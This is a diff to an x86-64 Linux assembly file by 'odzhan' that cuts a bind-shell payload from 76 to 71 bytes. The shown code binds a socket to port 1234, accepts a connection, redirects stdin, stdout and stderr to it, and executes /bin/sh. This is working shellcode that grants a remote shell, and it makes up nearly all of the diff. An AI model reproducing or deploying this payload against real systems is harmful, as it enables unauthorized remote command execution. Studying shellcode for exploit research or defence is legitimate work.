@@ -28,7 +28,7 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 76 byte bind shell for linux/x86-64
+; 71 byte bind shell for linux/x86-64
 ; odzhan
 
     bits    64
@@ -49,9 +49,9 @@
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
-    mov     eax, 0xd204FF02
-    inc     ah
-    push    rax
+    mov     ebx, 0xd204FF02
+    inc     bh
+    push    rbx
     push    rsp
     pop     rsi         ; rsi = &sa 
     mov     dl, 16      ; rdx = sizeof(sa) 
@@ -69,27 +69,27 @@
     mov     al, 43
     syscall
     
-    xchg    eax, edi         ; edi = r
-    xchg    eax, esi         ; esi = 2, eax = 0
+    xchg    eax, edi    ; edi = r
+    xchg    eax, esi    ; esi = 2, eax = 0
     
     ; step 5, assign socket handle to stdin,stdout,stderr
     ; dup2 (r, STDIN_FILENO)
     ; dup2 (r, STDOUT_FILENO)
     ; dup2 (r, STDERR_FILENO)
 dup_loop64:
-    mov     al, 33           ; rax=sys_dup2
+    mov     al, 33      ; rax = sys_dup2
     syscall
     sub     esi, 1
     jns     dup_loop64       ; jump if not signed   
     
     ; step 6, execute /bin/sh
     ; execve("/bin//sh", NULL, NULL);
-    xor     esi, esi         ; rsi=0
+    xor     esi, esi         ; rsi = 0
     push    rdx              ; zero terminator
     mov     rcx, '/bin//sh'
     push    rcx
     push    rsp
     pop     rdi
-    cdq                      ; rdx=0    
-    mov     al, 59           ; rax=sys_execve
+    cdq                      ; rdx = 0    
+    mov     al, 59           ; rax = sys_execve
     syscall
